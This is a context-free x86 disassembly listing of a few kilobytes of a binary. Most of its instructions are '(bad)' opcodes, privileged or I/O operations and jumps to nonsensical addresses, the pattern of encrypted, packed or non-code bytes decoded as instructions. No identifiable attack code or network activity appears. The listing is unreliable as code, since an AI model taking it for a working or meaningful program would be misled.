  4174b0:	(bad)  
  4174b1:	mov    edx,0x19cfc33
  4174b6:	mov    ?,WORD PTR [ebp+0x55]
  4174b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ba:	shl    DWORD PTR [ecx+0x54],0x41
  4174be:	mov    eax,0xfc1e8a8d
  4174c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174c4:	xor    bl,0x57
  4174c7:	push   ss
  4174c8:	test   DWORD PTR ds:0x92fd6a01,0xc9f29d89
  4174d2:	push   es
  4174d3:	and    ah,BYTE PTR [ebx]
  4174d5:	xchg   edx,eax
  4174d6:	test   eax,0x523bd223
  4174db:	mov    esi,0x97b7efd4
  4174e0:	xor    BYTE PTR [edi+0x46fbd7e5],bl
  4174e6:	out    0x13,eax
  4174e8:	mov    ah,0xd7
  4174ea:	mov    al,ds:0xafc10481
  4174ef:	or     al,0xd1
  4174f1:	sti    
  4174f2:	inc    sp
  4174f4:	pmaddwd mm0,QWORD PTR [edx]
  4174f7:	sub    DWORD PTR [esi+0x6b],0xcd8dae92
  4174fe:	mov    eax,ds:0xcb15f80d
  417503:	mov    WORD PTR [ebp+edi*1+0x460effd],gs
  41750a:	in     al,dx
  41750b:	mov    cs,esp
  41750d:	retf   
  41750e:	(bad)
  417511:	shr    BYTE PTR [edx],cl
  417513:	jbe    0x417554
  417515:	dec    esi
  417516:	scas   al,BYTE PTR es:[edi]
  417517:	fbld   TBYTE PTR [esi+0x3f132917]
  41751d:	iret   
  41751e:	sub    edi,DWORD PTR [edi-0x6a20c85a]
  417524:	xchg   esi,eax
  417525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417526:	or     eax,0x5d01d233
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    ebp,ecx
  417543:	shl    ebp,0x46
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x417598
  41754f:	aam    0x75
  417551:	sbb    DWORD PTR [ecx+edx*1-0x54],0x19b4f56e
  417559:	mov    BYTE PTR [ebp-0x36a382ee],ah
  41755f:	jp     0x417581
  417561:	push   esp
  417562:	sbb    dh,ch
  417564:	enter  0x4d9a,0x3a
  417568:	lock popf 
  41756a:	mov    ecx,eax
  41756c:	sub    al,BYTE PTR ds:0x90961d67
  417572:	jno    0x41756f
  417574:	mov    ss,ebp
  417576:	xor    edx,DWORD PTR [esi+0x7dd2d327]
  41757c:	xor    dh,BYTE PTR [esi+eiz*8-0x321d65b1]
  417583:	xchg   ebx,eax
  417584:	xor    eax,ebp
  417586:	test   BYTE PTR [edx+0x30867182],dl
  41758c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41758d:	loope  0x4175dc
  41758f:	repnz pusha 
  417591:	scas   eax,DWORD PTR es:[edi]
  417592:	(bad)  
  417593:	hlt    
  417594:	sub    BYTE PTR [ebp+0x4cc6d404],dl
  41759a:	xor    al,0x95
  41759c:	ds fcomi st,st(6)
  41759f:	daa    
  4175a0:	dec    esp
  4175a1:	and    al,0x63
  4175a3:	call   0x30ad:0xdc061143
  4175aa:	mov    esi,0x1053d139
  4175af:	pop    es
  4175b0:	jecxz  0x417553
  4175b2:	mov    eax,fs
  4175b4:	and    al,0x9a
  4175b6:	imul   esi,DWORD PTR [eax+edx*8-0x1ee59248],0x2c65e27b
  4175c1:	push   es
  4175c2:	cli    
  4175c3:	dec    esi
  4175c4:	pop    ebx
  4175c5:	mov    esi,0x34449ebc
  4175ca:	mov    WORD PTR [ecx-0x6118c287],ds
  4175d0:	dec    edi
  4175d1:	add    eax,0xecb9f45d
  4175d6:	test   DWORD PTR [ebx+eax*2+0x24],esp
  4175da:	pop    ecx
  4175db:	ja     0x4175ec
  4175dd:	mov    edx,cs
  4175df:	xchg   esi,eax
  4175e0:	adc    al,0x6d
  4175e2:	mov    esp,0x22f090e2
  4175e7:	daa    
  4175e8:	push   ss
  4175e9:	inc    edx
  4175ea:	sbb    eax,0x3ed4e464
  4175ef:	in     eax,dx
  4175f0:	aas    
  4175f1:	xlat   BYTE PTR ds:[ebx]
  4175f2:	cmp    edx,ebp
  4175f4:	sbb    cl,BYTE PTR [edi+0xc]
  4175f7:	pop    esp
  4175f8:	div    ecx
  4175fa:	jg     0x4175d7
  4175fc:	(bad)  
  4175fd:	jo     0x41761b
  4175ff:	sti    
  417600:	aad    0x68
  417602:	(bad)  
  417603:	mov    ds:0x30000c9b,al
  417608:	out    0xc2,eax
  41760a:	hlt    
  41760b:	sbb    BYTE PTR [ebp-0x40],bl
  41760e:	add    BYTE PTR [edx],al
  417610:	adc    ebx,ebx
  417612:	xor    DWORD PTR [edi+0x7e],ebp
  417615:	pop    ss
  417616:	outs   dx,BYTE PTR gs:[esi]
  417618:	mov    bh,dl
  41761a:	stc    
  41761b:	push   0x8c1bcc08
  417620:	pop    edx
  417621:	test   DWORD PTR [edx+0x46d5b98a],ecx
  417627:	adc    DWORD PTR [eax-0x67],esp
  41762a:	leave  
  41762b:	dec    edx
  41762c:	mov    ebp,0xc2a53c5
  417631:	loop   0x41764f
  417633:	xchg   ecx,eax
  417634:	push   es
  417635:	sbb    BYTE PTR [edi+edx*1-0x746456e9],al
  41763c:	dec    edi
  41763d:	push   ss
  41763e:	inc    esp
  41763f:	pop    ss
  417640:	cmp    eax,0xeac0508e
  417645:	sub    eax,0xdefa6790
  41764a:	jb     0x4175ec
  41764c:	xor    al,BYTE PTR [edx-0x1e]
  41764f:	stos   DWORD PTR es:[edi],eax
  417650:	xchg   ecx,eax
  417651:	push   0xef95582c
  417656:	ret    0x37d
  417659:	jmp    0x4dc1:0xfa7ff457
  417660:	dec    edx
  417661:	ja     0x417679
  417663:	jmp    0x417656
  417665:	mov    ecx,ebx
  417667:	pop    ss
  417668:	fld    QWORD PTR ds:0xae9a05b5
  41766e:	inc    dl
  417670:	cmp    dh,BYTE PTR [eax+0x7a]
  417673:	and    BYTE PTR [ebx],0x18
  417676:	jl     0x417646
  417678:	loop   0x4176cf
  41767a:	pop    ss
  41767b:	push   esp
  41767c:	clc    
  41767d:	(bad)  [edx]
  41767f:	adc    dh,ch
  417681:	add    BYTE PTR [ebp+0x28],0x5c
  417685:	imul   ebx,DWORD PTR [esi+0x34],0x4ab9bb84
  41768c:	icebp  
  41768d:	pop    ds
  41768e:	imul   esi,edx,0xffffffc8
  417691:	and    cl,BYTE PTR [eax-0x30e89427]
  417697:	dec    ebx
  417698:	scas   eax,DWORD PTR es:[edi]
  417699:	add    al,0xb6
  41769b:	out    dx,eax
  41769c:	int    0x69
  41769e:	mov    ds:0xdc1c8bec,al
  4176a3:	rol    BYTE PTR [esi-0x67e47a3f],0xd2
  4176aa:	xor    edi,DWORD PTR [esi-0x8]
  4176ad:	sbb    ebx,DWORD PTR [eax]
  4176af:	jge    0x41769b
  4176b1:	fmul   QWORD PTR [ebx]
  4176b3:	and    BYTE PTR [esi+ebx*4+0x72],0x9e
  4176b8:	and    BYTE PTR ds:[esi+0x74],ch
  4176bc:	mov    eax,ds:0xee69fe53
  4176c1:	sbb    ebx,DWORD PTR [esi-0x24abb598]
  4176c7:	push   esi
  4176c8:	ss mov esp,0xae754792
  4176ce:	add    BYTE PTR [ecx+0x2],al
  4176d1:	std    
  4176d2:	sbb    DWORD PTR [esi],edx
  4176d4:	loop   0x4176d9
  4176d6:	scas   al,BYTE PTR es:[edi]
  4176d7:	cwde   
  4176d8:	or     BYTE PTR [edi],0x85
  4176db:	cmp    eax,0x894faca1
  4176e0:	xchg   esp,eax
  4176e1:	lods   eax,DWORD PTR ds:[esi]
  4176e2:	popf   
  4176e3:	mov    dl,0xa6
  4176e5:	pop    esi
  4176e6:	adc    eax,0x6c614ed8
  4176eb:	add    DWORD PTR [edi],0x9c983231
  4176f1:	scas   eax,DWORD PTR es:[edi]
  4176f2:	repnz hlt 
  4176f4:	retf   
  4176f5:	js     0x41769b
  4176f7:	fneni(8087 only) 
  4176f9:	clc    
  4176fa:	cld    
  4176fb:	inc    ebp
  4176fc:	call   0x4b65:0xe8b5486a
  417703:	or     BYTE PTR [ebp+0x13],al
  417706:	add    al,0x3d
  417708:	jnp    0x41773d
  41770a:	jmp    0x75ddf6ff
  41770f:	jmp    0x515b:0xe6cea27c
  417716:	mov    eax,ds:0x656574fe
  41771b:	add    al,BYTE PTR ds:0x336d6b10
  417721:	int    0x12
  417723:	push   ecx
  417724:	(bad)  
  417725:	test   DWORD PTR [edx-0x28],0x265ebee9
  41772c:	sbb    ch,BYTE PTR [esi+ebx*2+0x3f]
  417730:	xchg   DWORD PTR [edx],esp
  417732:	hlt    
  417733:	mov    WORD PTR [ebx],fs
  417735:	fs pop ds
  417737:	xchg   edx,eax
  417738:	arpl   WORD PTR [ecx+0x51],si
  41773b:	out    dx,eax
  41773c:	stos   DWORD PTR es:[edi],eax
  41773d:	xchg   BYTE PTR [eax+0x7c],dh
  417740:	rcl    ebx,cl
  417742:	in     al,dx
  417743:	repnz or BYTE PTR [edi-0x49759c2a],dh
  41774a:	sub    DWORD PTR [ecx+0x12b9db96],esi
  417750:	loop   0x417744
  417752:	shl    ecx,1
  417754:	fnstcw WORD PTR [ecx+0x3febc39e]
  41775a:	js     0x417790
  41775c:	pop    ds
  41775d:	iret   
  41775e:	add    dl,dh
  417760:	sub    DWORD PTR [eax+esi*1+0x73],esp
  417764:	sbb    ebp,edx
  417766:	push   esp
  417767:	pop    ds
  417768:	retf   0x829a
  41776b:	xchg   ecx,eax
  41776c:	mov    ah,0x19
  41776e:	stos   DWORD PTR es:[edi],eax
  41776f:	mov    esp,0xe200d0c7
  417774:	(bad)  
  417776:	loope  0x4177e7
  417778:	xchg   ebp,eax
  417779:	xchg   ebp,eax
  41777a:	or     BYTE PTR ds:0x8e624418,al
  417780:	mov    ds:0x72be97b7,al
  417785:	mov    bh,0x35
  417787:	adc    BYTE PTR [esi+edx*1+0xe],al
  41778b:	stos   BYTE PTR es:[edi],al
  41778c:	or     BYTE PTR [edi+0xd],ch
  41778f:	nop
  417790:	rol    edi,0xe9
  417793:	repnz add edi,ecx
  417796:	jo     0x417808
  417798:	pop    edi
  417799:	inc    ecx
  41779a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41779b:	add    BYTE PTR [ecx+0x57],ch
  41779e:	add    esi,edx
  4177a0:	cld    
  4177a1:	jmp    0x8c3c:0x6e8d2600
  4177a8:	jne    0x417765
  4177aa:	test   al,0x49
  4177ac:	sbb    al,0x42
  4177ae:	mov    eax,DWORD PTR [ebp+0x54]
  4177b1:	dec    edi
  4177b2:	adc    eax,0x16f4b642
  4177b7:	mov    bh,0x52
  4177b9:	bound  esi,QWORD PTR [edi+edi*8-0x53]
  4177bd:	inc    eax
  4177be:	and    bl,BYTE PTR [esi]
  4177c0:	jecxz  0x4177a3
  4177c2:	lds    ebx,FWORD PTR [edx]
  4177c4:	retf   0x2165
  4177c7:	pop    ds
  4177c8:	lods   al,BYTE PTR ds:[esi]
  4177c9:	in     al,0x3f
  4177cb:	cmp    eax,0xb8cd8b6f
  4177d0:	lock iret 
  4177d2:	push   ebx
  4177d3:	inc    eax
  4177d4:	mov    dh,0x71
  4177d6:	and    al,0x26
  4177d8:	ins    BYTE PTR es:[edi],dx
  4177d9:	mov    ch,0xa
  4177db:	pop    ebx
  4177dc:	mov    dh,0x92
  4177de:	mov    ds:0xa288f6a7,eax
  4177e3:	test   al,0xcc
  4177e5:	xchg   edi,eax
  4177e6:	int3   
  4177e7:	out    dx,eax
  4177e8:	sti    
  4177e9:	xchg   esi,eax
  4177ea:	into   
  4177eb:	or     BYTE PTR [ecx],cl
  4177ed:	test   al,0x64
  4177ef:	jo     0x4177c5
  4177f1:	mov    ds:0x8ca77d15,eax
  4177f6:	mov    cl,0x38
  4177f8:	es std 
  4177fa:	jecxz  0x417785
  4177fc:	ror    eax,cl
  4177fe:	(bad)  [ecx-0x346753b5]
  417804:	mov    ch,0xb
  417806:	es add al,0xd3
  417809:	dec    DWORD PTR [eax]
  41780b:	xchg   esi,edi
  41780d:	in     al,dx
  41780e:	das    
  41780f:	aad    0x95
  417811:	lods   al,BYTE PTR ds:[esi]
  417812:	in     eax,dx
  417813:	cld    
  417814:	xchg   ecx,eax
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
